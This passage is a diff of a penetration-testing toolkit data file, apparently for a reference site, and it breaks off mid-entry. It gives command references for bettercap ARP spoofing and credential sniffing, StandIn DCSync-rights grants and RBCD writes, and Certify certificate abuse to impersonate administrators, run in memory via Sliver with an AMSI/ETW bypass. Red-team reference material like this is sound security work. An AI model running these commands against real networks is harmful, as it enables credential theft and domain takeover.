@@ -64,34 +64,116 @@ var TOOLKIT = [
         "description": "Test a server's TLS/SSL for protocols, ciphers, and known flaws.",
         "brief": "testssl.sh is a single Bash script that audits a host's TLS configuration end to end: supported protocols (SSLv2/3 through TLS 1.3), cipher strength and ordering, forward secrecy, certificate details and chain, HTTP security headers, and the full roster of named vulnerabilities (Heartbleed, ROBOT, POODLE, BEAST, CRIME, Sweet32, and more). It runs from one portable script with no external dependencies and produces clear, colour-graded output that is easy to turn into a report.",
         "quickReference": [
-          { "label": "Full test", "cmd": "testssl.sh https://target.com" },
-          { "label": "Only severe findings", "cmd": "testssl.sh --severity HIGH target.com:443" },
-          { "label": "Known vulnerabilities only", "cmd": "testssl.sh -U target.com" },
-          { "label": "Machine-readable output", "cmd": "testssl.sh --jsonfile out.json --csvfile out.csv target.com" }
+          {
+            "label": "Full test",
+            "cmd": "testssl.sh https://target.com"
+          },
+          {
+            "label": "Only severe findings",
+            "cmd": "testssl.sh --severity HIGH target.com:443"
+          },
+          {
+            "label": "Known vulnerabilities only",
+            "cmd": "testssl.sh -U target.com"
+          },
+          {
+            "label": "Machine-readable output",
+            "cmd": "testssl.sh --jsonfile out.json --csvfile out.csv target.com"
+          }
         ],
         "sections": [
-          { "title": "Useful Options", "type": "table", "columns": ["Flag", "Description"],
+          {
+            "title": "Useful Options",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Description"
+            ],
             "rows": [
-              ["-U / --vulnerable", "Test for all known TLS vulnerabilities"],
-              ["-p / --protocols", "Check which protocol versions are offered"],
-              ["-E / --cipher-per-proto", "Enumerate ciphers offered per protocol"],
-              ["-S / --server-defaults", "Certificate, chain, and server-default details"],
-              ["-H / --header", "Check HTTP security headers (HSTS, etc.)"],
-              ["--severity <LOW|MEDIUM|HIGH|CRITICAL>", "Only report findings at or above this level"],
-              ["--jsonfile / --csvfile / --htmlfile", "Write machine-readable or HTML reports"],
-              ["--sneaky / --quiet", "Reduce fingerprint/noise of the scan"],
-              ["--starttls <proto>", "Test STARTTLS services (smtp, imap, pop3, ftp, xmpp, ...)"]
-            ] },
-          { "title": "Notes & Tips", "type": "notes", "items": [
-            "Run against host:port, not just a URL, so you can test mail and other TLS services (e.g. --starttls smtp mail.target.com:25).",
-            "Use the official Docker image or the git clone for the newest cipher/vuln database: docker run --rm drwetter/testssl.sh target.com.",
-            "Map the findings straight onto the Weak TLS / SSL Configuration write-up — testssl's output is the evidence for that report.",
-            "Prefer --severity HIGH for a quick triage, then a full run for the detailed appendix."
-          ] },
-          { "title": "References", "type": "references", "items": [
-            { "label": "testssl.sh — GitHub", "url": "https://github.com/drwetter/testssl.sh" },
-            { "label": "testssl.sh — documentation", "url": "https://testssl.sh/" }
-          ] }
+              [
+                "-U / --vulnerable",
+                "Test for all known TLS vulnerabilities"
+              ],
+              [
+                "-p / --protocols",
+                "Check which protocol versions are offered"
+              ],
+              [
+                "-E / --cipher-per-proto",
+                "Enumerate ciphers offered per protocol"
+              ],
+              [
+                "-S / --server-defaults",
+                "Certificate, chain, and server-default details"
+              ],
+              [
+                "-H / --header",
+                "Check HTTP security headers (HSTS, etc.)"
+              ],
+              [
+                "--severity <LOW|MEDIUM|HIGH|CRITICAL>",
+                "Only report findings at or above this level"
+              ],
+              [
+                "--jsonfile / --csvfile / --htmlfile",
+                "Write machine-readable or HTML reports"
+              ],
+              [
+                "--sneaky / --quiet",
+                "Reduce fingerprint/noise of the scan"
+              ],
+              [
+                "--starttls <proto>",
+                "Test STARTTLS services (smtp, imap, pop3, ftp, xmpp, ...)"
+              ]
+            ]
+          },
+          {
+            "title": "Common Workflows",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Full graded report to files",
+                "cmd": "testssl.sh --severity LOW --htmlfile r.html --jsonfile r.json target.com:443"
+              },
+              {
+                "label": "STARTTLS services (mail, etc.)",
+                "cmd": "testssl.sh --starttls smtp mail.target.com:25\ntestssl.sh --starttls imap mail.target.com:143"
+              },
+              {
+                "label": "Targeted single checks",
+                "cmd": "testssl.sh -p target.com          # protocols only\ntestssl.sh --heartbleed --robot --logjam target.com   # named flaws only"
+              },
+              {
+                "label": "Mass / parallel scan",
+                "cmd": "testssl.sh --file hosts.txt --parallel --severity MEDIUM"
+              }
+            ]
+          },
+          {
+            "title": "Notes & Tips",
+            "type": "notes",
+            "items": [
+              "Run against host:port, not just a URL, so you can test mail and other TLS services (e.g. --starttls smtp mail.target.com:25).",
+              "Use the official Docker image or the git clone for the newest cipher/vuln database: docker run --rm drwetter/testssl.sh target.com.",
+              "Map the findings straight onto the Weak TLS / SSL Configuration write-up — testssl's output is the evidence for that report.",
+              "Prefer --severity HIGH for a quick triage, then a full run for the detailed appendix."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "testssl.sh — GitHub",
+                "url": "https://github.com/drwetter/testssl.sh"
+              },
+              {
+                "label": "testssl.sh — documentation",
+                "url": "https://testssl.sh/"
+              }
+            ]
+          }
         ]
       },
       {
@@ -360,72 +442,118 @@ var TOOLKIT = [
               ]
       },
       {
-              "id": "bettercap",
-              "name": "bettercap",
-              "url": "https://github.com/bettercap/bettercap",
-              "description": "Swiss-army knife for network attacks and monitoring — ARP/DNS spoofing, sniffing and MITM.",
-              "brief": "bettercap is a modular network-attack and monitoring framework. Through interactive modules (\"caplets\") it performs host discovery, ARP/DNS spoofing, traffic sniffing and man-in-the-middle on a local segment. On an internal engagement it is the tool that puts you in the middle of layer-2 traffic so you can capture or redirect authentication.\n\nFor AD work bettercap pairs with a relay/capture tool: ARP-spoof a victim toward you, then feed the coerced or redirected SMB/HTTP authentication into Responder or ntlmrelayx. It is noisy at layer 2 (gratuitous ARP, duplicate MACs), so use it where dynamic ARP inspection and port security are absent.",
-              "quickReference": [
-                      {
-                              "label": "Start on an interface",
-                              "cmd": "sudo bettercap -iface <iface>"
-                      },
-                      {
-                              "label": "Discover hosts",
-                              "cmd": "net.probe on\nnet.show"
-                      },
-                      {
-                              "label": "ARP spoof a target",
-                              "cmd": "set arp.spoof.targets <victim_ip>\narp.spoof on"
-                      },
-                      {
-                              "label": "Sniff credentials",
-                              "cmd": "set net.sniff.verbose true\nnet.sniff on"
-                      }
+        "id": "bettercap",
+        "name": "bettercap",
+        "url": "https://github.com/bettercap/bettercap",
+        "description": "Swiss-army knife for network attacks and monitoring — ARP/DNS spoofing, sniffing and MITM.",
+        "brief": "bettercap is a modular network-attack and monitoring framework. Through interactive modules (\"caplets\") it performs host discovery, ARP/DNS spoofing, traffic sniffing and man-in-the-middle on a local segment. On an internal engagement it is the tool that puts you in the middle of layer-2 traffic so you can capture or redirect authentication.\n\nFor AD work bettercap pairs with a relay/capture tool: ARP-spoof a victim toward you, then feed the coerced or redirected SMB/HTTP authentication into Responder or ntlmrelayx. It is noisy at layer 2 (gratuitous ARP, duplicate MACs), so use it where dynamic ARP inspection and port security are absent.",
+        "quickReference": [
+          {
+            "label": "Start on an interface",
+            "cmd": "sudo bettercap -iface <iface>"
+          },
+          {
+            "label": "Discover hosts",
+            "cmd": "net.probe on\nnet.show"
+          },
+          {
+            "label": "ARP spoof a target",
+            "cmd": "set arp.spoof.targets <victim_ip>\narp.spoof on"
+          },
+          {
+            "label": "Sniff credentials",
+            "cmd": "set net.sniff.verbose true\nnet.sniff on"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Key modules",
+            "type": "table",
+            "columns": [
+              "Module",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "net.probe / net.recon",
+                "Active host discovery and passive recon on the segment"
               ],
-              "sections": [
-                      {
-                              "title": "MITM workflow",
-                              "type": "commands",
-                              "commands": [
-                                      {
-                                              "label": "Recon the segment",
-                                              "cmd": "sudo bettercap -iface <iface>\n> net.probe on\n> net.show                      # list discovered hosts"
-                                      },
-                                      {
-                                              "label": "ARP poison and intercept",
-                                              "cmd": "> set arp.spoof.targets <victim_ip>\n> set arp.spoof.fullduplex true\n> arp.spoof on\n> net.sniff on                 # capture traffic passing through you"
-                                      },
-                                      {
-                                              "label": "One-liner via caplet / eval",
-                                              "cmd": "sudo bettercap -iface <iface> -eval 'set arp.spoof.targets <victim>; arp.spoof on; net.sniff on'"
-                                      }
-                              ]
-                      },
-                      {
-                              "title": "OPSEC & defence",
-                              "type": "notes",
-                              "items": [
-                                      "ARP spoofing is loud — duplicate-MAC and gratuitous-ARP alerts fire on any switch with security features or an NSM watching layer 2.",
-                                      "Pair with Responder (capture) or ntlmrelayx (relay) to turn redirected auth into NetNTLM hashes or code execution — see Coercion & NTLM Relay theory.",
-                                      "Defences: dynamic ARP inspection, DHCP snooping, port security, and 802.1X neutralise it."
-                              ]
-                      },
-                      {
-                              "title": "References",
-                              "type": "references",
-                              "items": [
-                                      {
-                                              "label": "bettercap — GitHub",
-                                              "url": "https://github.com/bettercap/bettercap"
-                                      },
-                                      {
-                                              "label": "Theory — Coercion & NTLM Relay",
-                                              "url": "theory/2026-08-18-coercion-ntlm-relay.html"
-                                      }
-                              ]
-                      }
+              [
+                "net.show",
+                "List discovered hosts, MACs and vendors"
+              ],
+              [
+                "arp.spoof",
+                "ARP-poison targets to sit in the middle (set arp.spoof.targets, arp.spoof.fullduplex)"
+              ],
+              [
+                "dns.spoof",
+                "Answer DNS queries with attacker IPs (set dns.spoof.domains)"
+              ],
+              [
+                "net.sniff",
+                "Capture and parse traffic passing through you (creds, tokens)"
+              ],
+              [
+                "http.proxy / https.proxy",
+                "Transparent HTTP(S) proxy; load the hstshijack caplet to strip HSTS"
+              ],
+              [
+                "wifi.recon / wifi.deauth",
+                "Monitor-mode AP/client recon and deauthentication"
+              ],
+              [
+                "ble.recon",
+                "Bluetooth Low Energy device enumeration"
+              ],
+              [
+                "caplets / events.stream",
+                "Scripted sessions (.cap) and the live event log"
               ]
+            ]
+          },
+          {
+            "title": "MITM workflow",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Recon the segment",
+                "cmd": "sudo bettercap -iface <iface>\n> net.probe on\n> net.show                      # list discovered hosts"
+              },
+              {
+                "label": "ARP poison and intercept",
+                "cmd": "> set arp.spoof.targets <victim_ip>\n> set arp.spoof.fullduplex true\n> arp.spoof on\n> net.sniff on                 # capture traffic passing through you"
+              },
+              {
+                "label": "One-liner via caplet / eval",
+                "cmd": "sudo bettercap -iface <iface> -eval 'set arp.spoof.targets <victim>; arp.spoof on; net.sniff on'"
+              }
+            ]
+          },
+          {
+            "title": "OPSEC & defence",
+            "type": "notes",
+            "items": [
+              "ARP spoofing is loud — duplicate-MAC and gratuitous-ARP alerts fire on any switch with security features or an NSM watching layer 2.",
+              "Pair with Responder (capture) or ntlmrelayx (relay) to turn redirected auth into NetNTLM hashes or code execution — see Coercion & NTLM Relay theory.",
+              "Defences: dynamic ARP inspection, DHCP snooping, port security, and 802.1X neutralise it."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "bettercap — GitHub",
+                "url": "https://github.com/bettercap/bettercap"
+              },
+              {
+                "label": "Theory — Coercion & NTLM Relay",
+                "url": "theory/2026-08-18-coercion-ntlm-relay.html"
+              }
+            ]
+          }
+        ]
       }
     ]
   },
@@ -2551,137 +2679,465 @@ var TOOLKIT = [
         ]
       },
       {
-        id: "standin",
-        name: "StandIn",
-        url: "https://github.com/FuzzySecurity/StandIn",
-        description: "Small C# AD post-exploitation toolkit for LDAP enumeration and object manipulation, run in memory via execute-assembly.",
-        brief: "StandIn is a compact C# toolkit for Active Directory enumeration and manipulation, designed to be run in memory (Sliver/Cobalt Strike execute-assembly) instead of PowerShell, so it sidesteps script-block logging and AMSI. It takes raw LDAP filters and can also read and write specific object attributes — enumerate users, computers, groups, OUs, GPOs and delegation, and set attributes such as msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD or add DCSync rights.\n\nIt is the go-to replacement for PowerView/SharpView on engagements where those are detected, because it is small, single-purpose, and driven by LDAP queries the operator writes.",
-        quickReference: [
-          { label: "Raw LDAP query", cmd: "StandIn.exe --ldap \"(&(objectCategory=person)(objectClass=user))\"" },
-          { label: "One object, selected attrs", cmd: "StandIn.exe --object samaccountname=administrator --filter description,lastlogon" },
-          { label: "Find delegation", cmd: "StandIn.exe --delegation" },
-          { label: "List OUs / GPOs", cmd: "StandIn.exe --ou    |    StandIn.exe --gpo" }
-        ],
-        sections: [
+        "id": "standin",
+        "name": "StandIn",
+        "url": "https://github.com/FuzzySecurity/StandIn",
+        "description": "Small C# AD post-exploitation toolkit for LDAP enumeration and object manipulation, run in memory via execute-assembly.",
+        "brief": "StandIn is a compact C# toolkit for Active Directory enumeration and manipulation, designed to be run in memory (Sliver/Cobalt Strike execute-assembly) instead of PowerShell, so it sidesteps script-block logging and AMSI. It takes raw LDAP filters and can also read and write specific object attributes — enumerate users, computers, groups, OUs, GPOs and delegation, and set attributes such as msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD or add DCSync rights.\n\nIt is the go-to replacement for PowerView/SharpView on engagements where those are detected, because it is small, single-purpose, and driven by LDAP queries the operator writes.",
+        "quickReference": [
           {
-            title: "Common Usage (via Sliver execute-assembly)",
-            type: "commands",
-            commands: [
-              { label: "Enumerate objects with a raw LDAP filter", cmd: "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--ldap \"(&(objectCategory=person)(objectClass=user))\"'\n# --filter <attrs> to return only specific properties; --limit to cap results" },
-              { label: "Inspect a single object", cmd: "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--object samaccountname=krbtgt --filter serviceprincipalname,description'" },
-              { label: "Delegation, OUs, GPOs, DCSync rights", cmd: "'/path/StandIn.exe' --delegation      # unconstrained/constrained/RBCD objects\n'/path/StandIn.exe' '--ou'  |  '--gpo'\n'/path/StandIn.exe' '--object \"DC=<domain-dn>\" --dsync <user>'   # add DCSync" },
-              { label: "Write RBCD (msDS-AllowedToActOnBehalfOf...)", cmd: "'/path/StandIn.exe' '--computer <target>$ --sid <attacker-machine-sid>'   # configure RBCD" }
+            "label": "Raw LDAP query",
+            "cmd": "StandIn.exe --ldap \"(&(objectCategory=person)(objectClass=user))\""
+          },
+          {
+            "label": "One object, selected attrs",
+            "cmd": "StandIn.exe --object samaccountname=administrator --filter description,lastlogon"
+          },
+          {
+            "label": "Find delegation / SPNs",
+            "cmd": "StandIn.exe --delegation    |    StandIn.exe --spn"
+          },
+          {
+            "label": "Grant DCSync rights",
+            "cmd": "StandIn.exe --object \"distinguishedname=DC=corp,DC=local\" --grant \"CORP\\me\" --type DCSync"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Key flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "--object <attr=val> / --filter <attrs>",
+                "Resolve an object and return selected attributes"
+              ],
+              [
+                "--ldap \"<filter>\" / --limit <n>",
+                "Raw LDAP query; cap the result count (default 50)"
+              ],
+              [
+                "--delegation",
+                "List unconstrained / constrained / RBCD objects"
+              ],
+              [
+                "--asrep / --spn",
+                "AS-REP-roastable accounts / accounts with SPNs (Kerberoast)"
+              ],
+              [
+                "--gpo [--acl]",
+                "Enumerate GPOs and, with --acl, their DACLs"
+              ],
+              [
+                "--group <name> --ntaccount <DOM\\user> --add|--remove",
+                "Read or modify group membership"
+              ],
+              [
+                "--computer <name> --make",
+                "Create a machine account (ms-DS-MachineAccountQuota applies)"
+              ],
+              [
+                "--computer <target> --sid <SID> [--remove]",
+                "Set/clear msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)"
+              ],
+              [
+                "--object \"<dn>\" --grant \"<DOM\\user>\" --type <right>",
+                "Grant rights (GenericAll/GenericWrite/ResetPassword/WriteMembers/DCSync) or --guid"
+              ],
+              [
+                "--adcs [--clientauth]",
+                "Enumerate AD CS templates (client-authentication EKUs)"
+              ],
+              [
+                "--domain / --user / --pass / --dc",
+                "Explicit credentials and target DC"
+              ]
             ]
           },
           {
-            title: "Notes",
-            type: "notes",
-            items: [
+            "title": "Common Usage (via Sliver execute-assembly)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Enumerate objects with a raw LDAP filter",
+                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--ldap \"(&(objectCategory=person)(objectClass=user))\"'\n# --filter <attrs> returns only specific properties; --limit caps results (default 50)"
+              },
+              {
+                "label": "Inspect a single object",
+                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/StandIn.exe' '--object samaccountname=krbtgt --filter serviceprincipalname,description'"
+              },
+              {
+                "label": "Delegation / SPNs / GPOs (with ACLs)",
+                "cmd": "'/path/StandIn.exe' --delegation          # unconstrained / constrained / RBCD\n'/path/StandIn.exe' --spn                 # Kerberoastable SPNs\n'/path/StandIn.exe' --gpo --acl           # GPOs and their ACLs"
+              },
+              {
+                "label": "Add a computer account, then set RBCD",
+                "cmd": "'/path/StandIn.exe' --computer EvilPC --make                 # needs MachineAccountQuota > 0\n'/path/StandIn.exe' --computer <target> --sid <EvilPC-SID>   # write msDS-AllowedToActOnBehalfOfOtherIdentity"
+              },
+              {
+                "label": "Grant DCSync (or other rights) over the domain",
+                "cmd": "'/path/StandIn.exe' '--object \"distinguishedname=DC=corp,DC=local\" --grant \"CORP\\me\" --type DCSync'\n# --type: GenericAll | GenericWrite | ResetPassword | WriteMembers | DCSync  (or --guid <rightsGuid>)"
+              }
+            ]
+          },
+          {
+            "title": "Notes",
+            "type": "notes",
+            "items": [
               "Run inline (execute-assembly -i -M -E) to apply Sliver's AMSI/ETW bypass in the current process for the quietest execution.",
               "Because it speaks raw LDAP, consecutive queries still trip Microsoft Defender for Identity — pace enumeration on real engagements.",
               "Pairs with ADSearch (read-only enumeration) and Rubeus/PEzor (ticket and credential steps) in the standard in-memory AD workflow."
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "StandIn — GitHub (FuzzySecurity)", url: "https://github.com/FuzzySecurity/StandIn" },
-              { label: "Toolkit — Sliver (execute-assembly workflow)", url: "toolkit.html" }
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "StandIn — GitHub (FuzzySecurity)",
+                "url": "https://github.com/FuzzySecurity/StandIn"
+              },
+              {
+                "label": "Toolkit — Sliver (execute-assembly workflow)",
+                "url": "toolkit.html"
+              }
             ]
           }
         ]
       },
       {
-        id: "adsearch",
-        name: "ADSearch",
-        url: "https://github.com/tomcarver16/ADSearch",
-        description: "C# tool for quick, targeted LDAP searches in Active Directory, built for in-memory use by C2 frameworks.",
-        brief: "ADSearch is a lightweight C# utility for running LDAP queries against Active Directory and returning selected attributes, built to be executed in memory by a C2 (execute-assembly). It offers shortcut switches for common objects (--users, --computers, --groups) and a --search flag for arbitrary LDAP filters, with --attributes to limit the returned properties.\n\nIt is a read-only enumeration companion to StandIn: where StandIn can also modify objects, ADSearch focuses on fast, clean querying and is convenient for mapping users, computers, groups, domains and trusts.",
-        quickReference: [
-          { label: "All users / computers / groups", cmd: "ADSearch.exe --users   |   --computers   |   --groups" },
-          { label: "Custom LDAP filter", cmd: "ADSearch.exe --search \"(samaccountname=administrator)\" --attributes cn,description" },
-          { label: "Enumerate trusts", cmd: "ADSearch.exe --search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection" }
-        ],
-        sections: [
+        "id": "adsearch",
+        "name": "ADSearch",
+        "url": "https://github.com/tomcarver16/ADSearch",
+        "description": "C# tool for quick, targeted LDAP searches in Active Directory, built for in-memory use by C2 frameworks.",
+        "brief": "ADSearch is a lightweight C# utility for running LDAP queries against Active Directory and returning selected attributes, built to be executed in memory by a C2 (execute-assembly). It offers shortcut switches for common objects (--users, --computers, --groups) and a --search flag for arbitrary LDAP filters, with --attributes to limit the returned properties.\n\nIt is a read-only enumeration companion to StandIn: where StandIn can also modify objects, ADSearch focuses on fast, clean querying and is convenient for mapping users, computers, groups, domains and trusts.",
+        "quickReference": [
           {
-            title: "Common Usage (via Sliver execute-assembly)",
-            type: "commands",
-            commands: [
-              { label: "Shortcut enumeration", cmd: "execute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--users'\nexecute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--computers'" },
-              { label: "Arbitrary filter with selected attributes", cmd: "'/path/ADSearch.exe' '--search \"(&(objectCategory=person)(objectClass=user))\" --attributes cn,logoncount,description'" },
-              { label: "Domains and trusts", cmd: "'/path/ADSearch.exe' '--search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection,trustAttributes'" }
+            "label": "All users / computers / groups",
+            "cmd": "ADSearch.exe --users   |   --computers   |   --groups"
+          },
+          {
+            "label": "Custom LDAP filter",
+            "cmd": "ADSearch.exe --search \"(samaccountname=administrator)\" --attributes cn,description"
+          },
+          {
+            "label": "Enumerate trusts",
+            "cmd": "ADSearch.exe --search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Common Usage (via Sliver execute-assembly)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Shortcut enumeration",
+                "cmd": "execute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--users'\nexecute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--computers'"
+              },
+              {
+                "label": "Arbitrary filter with selected attributes",
+                "cmd": "'/path/ADSearch.exe' '--search \"(&(objectCategory=person)(objectClass=user))\" --attributes cn,logoncount,description'"
+              },
+              {
+                "label": "Domains and trusts",
+                "cmd": "'/path/ADSearch.exe' '--search \"(objectClass=trustedDomain)\" --attributes cn,trustDirection,trustAttributes'"
+              }
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "ADSearch — GitHub (tomcarver16)", url: "https://github.com/tomcarver16/ADSearch" }
+            "title": "Key flags",
+            "type": "table",
+            "columns": [
+              "Flag",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "--users / --computers / --groups",
+                "Shortcut enumeration of common object classes"
+              ],
+              [
+                "--domain-admins",
+                "Members of the Domain Admins group"
+              ],
+              [
+                "--spns",
+                "Accounts with a servicePrincipalName (Kerberoast targets)"
+              ],
+              [
+                "--search \"<LDAP filter>\"",
+                "Arbitrary LDAP query"
+              ],
+              [
+                "--attributes <a,b,c>",
+                "Return only these attributes (default: a sensible set)"
+              ],
+              [
+                "--full",
+                "Return every attribute of each result"
+              ],
+              [
+                "--json / --output <file>",
+                "Machine-readable output / write results to a file"
+              ],
+              [
+                "--domain <fqdn> / --hostname <dc> / --port <n>",
+                "Target domain, specific DC, and LDAP port"
+              ],
+              [
+                "--username <u> / --password <p> / --insecure",
+                "Explicit credentials (else the current token); LDAP without TLS"
+              ]
+            ]
+          },
+          {
+            "title": "Notes & Tips",
+            "type": "notes",
+            "items": [
+              "Read-only companion to StandIn: use ADSearch to map users/computers/groups/trusts quickly, and StandIn when you also need to write objects.",
+              "Built for execute-assembly, so it avoids PowerShell logging — but bulk LDAP from a workstation still trips Microsoft Defender for Identity; keep queries targeted.",
+              "The DC flag is --hostname (not --domaincontroller); --json / --output feed results straight into BloodHound or your notes."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "ADSearch — GitHub (tomcarver16)",
+                "url": "https://github.com/tomcarver16/ADSearch"
+              }
             ]
           }
         ]
       },
       {
-        id: "certify",
-        name: "Certify",
-        url: "https://github.com/GhostPack/Certify",
-        description: "C# tool to enumerate and abuse Active Directory Certificate Services (AD CS) misconfigurations (ESC1–ESC8).",
-        brief: "Certify is GhostPack's C# tool for finding and abusing AD CS misconfigurations. It enumerates certificate authorities and templates, flags vulnerable templates (enrollee-supplies-subject, dangerous EKUs, enrollment-agent templates), and requests certificates — including with an arbitrary Subject Alternative Name (ESC1) or on behalf of another user via an enrollment-agent certificate (ESC3). The resulting PFX is used with Rubeus to obtain a TGT for the impersonated (often Domain Admin) account.\n\nIt is the C# counterpart to Certipy (Python) and the natural choice when working in memory from a Windows foothold via execute-assembly.",
-        quickReference: [
-          { label: "Enumerate CAs / templates", cmd: "Certify.exe cas   |   Certify.exe find" },
-          { label: "Find vulnerable templates", cmd: "Certify.exe find /vulnerable    (or /enrolleeSuppliesSubject)" },
-          { label: "ESC1 request (arbitrary SAN)", cmd: "Certify.exe request /ca:<ca> /template:<tmpl> /altname:administrator" },
-          { label: "Convert + get TGT", cmd: "openssl pkcs12 ... -> Rubeus asktgt /certificate:<pfx> /ptt" }
-        ],
-        sections: [
+        "id": "certify",
+        "name": "Certify",
+        "url": "https://github.com/GhostPack/Certify",
+        "description": "C# tool to enumerate and abuse Active Directory Certificate Services (AD CS) misconfigurations (ESC1–ESC8).",
+        "brief": "Certify is GhostPack's C# tool for finding and abusing AD CS misconfigurations. It enumerates certificate authorities and templates, flags vulnerable templates (enrollee-supplies-subject, dangerous EKUs, enrollment-agent templates), and requests certificates — including with an arbitrary Subject Alternative Name (ESC1) or on behalf of another user via an enrollment-agent certificate (ESC3). The resulting PFX is used with Rubeus to obtain a TGT for the impersonated (often Domain Admin) account.\n\nIt is the C# counterpart to Certipy (Python) and the natural choice when working in memory from a Windows foothold via execute-assembly.",
+        "quickReference": [
           {
-            title: "Enumeration & Certificate Requests (via Sliver execute-assembly)",
-            type: "commands",
-            commands: [
-              { label: "Enumerate CAs and templates", cmd: "execute-assembly -p explorer.exe -t 40 '/path/Certify.exe' cas\nexecute-assembly -p explorer.exe -t 40 '/path/Certify.exe' find\n'/path/Certify.exe' 'find /vulnerable'   |   'find /enrolleeSuppliesSubject'" },
-              { label: "Request a certificate with an arbitrary SAN (enrollee-supplies-subject template)", cmd: "'/path/Certify.exe' 'request /ca:<ca> /template:<template> /altname:<target-user>'" },
-              { label: "Request an enrollment-agent cert, then enroll on behalf of another user", cmd: "'/path/Certify.exe' 'request /ca:<ca> /template:<enrollment-agent-template>'\n'/path/Certify.exe' 'request /ca:<ca> /template:<target-template> /onbehalfof:<domain>\\<target-user> /enrollcert:<agent>.pfx /enrollcertpw:<pfx-password>'" },
-              { label: "Convert the issued PEM to a PFX for use", cmd: "openssl pkcs12 -in <cert>.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out <cert>.pfx\n# the PFX is then used for authentication (e.g. Rubeus asktgt) — see Vulns -> AD CS ESC for the full chain" }
+            "label": "Enumerate CAs / templates",
+            "cmd": "Certify.exe cas   |   Certify.exe find"
+          },
+          {
+            "label": "Find vulnerable templates",
+            "cmd": "Certify.exe find /vulnerable    (or /enrolleeSuppliesSubject)"
+          },
+          {
+            "label": "ESC1 request (arbitrary SAN)",
+            "cmd": "Certify.exe request /ca:<ca> /template:<tmpl> /altname:administrator"
+          },
+          {
+            "label": "Convert + get TGT",
+            "cmd": "openssl pkcs12 ... -> Rubeus asktgt /certificate:<pfx> /ptt"
+          }
+        ],
+        "sections": [
+          {
+            "title": "Enumeration & Certificate Requests (via Sliver execute-assembly)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Enumerate CAs and templates",
+                "cmd": "execute-assembly -p explorer.exe -t 40 '/path/Certify.exe' cas\nexecute-assembly -p explorer.exe -t 40 '/path/Certify.exe' find\n'/path/Certify.exe' 'find /vulnerable'   |   'find /enrolleeSuppliesSubject'"
+              },
+              {
+                "label": "Request a certificate with an arbitrary SAN (enrollee-supplies-subject template)",
+                "cmd": "'/path/Certify.exe' 'request /ca:<ca> /template:<template> /altname:<target-user>'"
+              },
+              {
+                "label": "Request an enrollment-agent cert, then enroll on behalf of another user",
+                "cmd": "'/path/Certify.exe' 'request /ca:<ca> /template:<enrollment-agent-template>'\n'/path/Certify.exe' 'request /ca:<ca> /template:<target-template> /onbehalfof:<domain>\\<target-user> /enrollcert:<agent>.pfx /enrollcertpw:<pfx-password>'"
+              },
+              {
+                "label": "Convert the issued PEM to a PFX for use",
+                "cmd": "openssl pkcs12 -in <cert>.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out <cert>.pfx\n# the PFX is then used for authentication (e.g. Rubeus asktgt) — see Vulns -> AD CS ESC for the full chain"
+              }
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "Certify — GitHub (GhostPack)", url: "https://github.com/GhostPack/Certify" },
-              { label: "Vulns — AD CS ESC misconfigurations", url: "vulns.html" },
-              { label: "Theory — Active Directory Certificate Services", url: "theory/2026-08-18-adcs.html" }
+            "title": "Commands & flags",
+            "type": "table",
+            "columns": [
+              "Command",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "Certify.exe cas",
+                "List CAs, their templates and relevant flags"
+              ],
+              [
+                "Certify.exe find",
+                "Enumerate all certificate templates"
+              ],
+              [
+                "find /vulnerable",
+                "Only templates with an ESC misconfiguration"
+              ],
+              [
+                "find /enrolleeSuppliesSubject",
+                "ESC1 candidates (requester supplies the SAN)"
+              ],
+              [
+                "find /ca:<CA>",
+                "Scope enumeration to a single CA"
+              ],
+              [
+                "request /ca:<CA> /template:<T> /altname:<user>",
+                "ESC1 — request a cert with an arbitrary SAN"
+              ],
+              [
+                "request /ca:<CA> /template:<agentT>  then  /onbehalfof:<DOM\\user> /enrollcert:<agent>.pfx /enrollcertpw:<pw>",
+                "ESC3 — enrollment-agent, then enrol on behalf of a target"
+              ],
+              [
+                "download /id:<reqId>",
+                "Retrieve an issued/pending request (e.g. after ESC7 approval)"
+              ],
+              [
+                "pkiobjects",
+                "Dump PKI objects and their ACLs (ESC4 / ESC5)"
+              ]
+            ]
+          },
+          {
+            "title": "Notes & Tips",
+            "type": "notes",
+            "items": [
+              "ESC mapping: ESC1 = /altname on an enrollee-supplies-subject template; ESC3 = enrollment agent; ESC6/7/8 live on the CA / web-enrollment side. Full chain: the AD CS theory page and the AD map ADCS stage.",
